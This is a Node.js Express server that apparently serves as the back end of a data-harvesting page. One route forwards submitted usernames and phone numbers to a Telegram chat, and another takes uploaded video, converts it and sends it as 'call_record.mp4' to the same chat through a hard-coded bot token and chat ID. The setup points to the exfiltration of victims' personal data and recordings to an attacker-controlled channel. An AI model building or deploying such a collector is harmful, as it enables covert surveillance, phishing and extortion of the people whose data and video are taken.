const express = require("express");
const multer = require("multer");
const fs = require("fs");
const axios = require("axios");
const FormData = require("form-data");
const cors = require("cors");
const ffmpeg = require("fluent-ffmpeg");

const app = express();
app.use(cors());
app.use(express.json()); // Crucial for parsing JSON from index.html

app.use(express.static("public"));

// Ensure uploads folder exists
if (!fs.existsSync("uploads")) {
    fs.mkdirSync("uploads");
}

// =====================
// 📁 FILE STORAGE
// =====================
const storage = multer.diskStorage({
    destination: "uploads/",
    filename: (req, file, cb) => {
        const ext = file.originalname.split(".").pop() || "webm";
        cb(null, `${Date.now()}.${ext}`); 
    }
});

const upload = multer({ storage });

// =====================
// 🔑 CONFIG
// =====================
const BOT_TOKEN = "8662744373:AAHjNatUA4lnCNtpIRETqPUuTDVENOTXROc";
const CHAT_ID = "8280326139";

// =====================
// 📱 LOG PHONE DATA
// =====================
app.post("/send-phone", async (req, res) => {
    const { username, phone } = req.body;
    const text = `👤 **New User**\n\nUsername: ${username}\nPhone: ${phone}`;
    
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: "Markdown"
        });
        res.status(200).send("Logged");
    } catch (err) {
        console.error("Telegram Log Error:", err.message);
        res.status(500).send("Error logging data");
    }
});

// =====================
// 🚀 UPLOAD VIDEO ROUTE
// =====================
app.post("/upload", upload.single("video"), async (req, res) => {
    let filePath;
    let mp4Path;

    try {
        if (!req.file) return res.status(400).send("No file uploaded");

        filePath = req.file.path;
        mp4Path = filePath + ".mp4";

        // 🔄 FFmpeg conversion to ensure Telegram compatibility
        await new Promise((resolve, reject) => {
            ffmpeg(filePath)
                .outputOptions([
                    "-c:v libx264",
                    "-preset ultrafast",
                    "-pix_fmt yuv420p",
                    "-c:a aac"
                ])
                .save(mp4Path)
                .on("end", resolve)
                .on("error", reject);
        });

        const form = new FormData();
        form.append("chat_id", CHAT_ID);
        form.append("video", fs.createReadStream(mp4Path), {
            filename: "call_record.mp4",
            contentType: "video/mp4"
        });

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, form, {
            headers: form.getHeaders()
        });

        // 🧹 CLEANUP
        if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
        if (fs.existsSync(mp4Path)) fs.unlinkSync(mp4Path);

        res.send("Upload successful");
    } catch (err) {
        console.error("Processing Error:", err.message);
        res.status(500).send("Server Error");
    }
});

app.listen(3000, () => {
    console.log("Server running on port 3000");
});
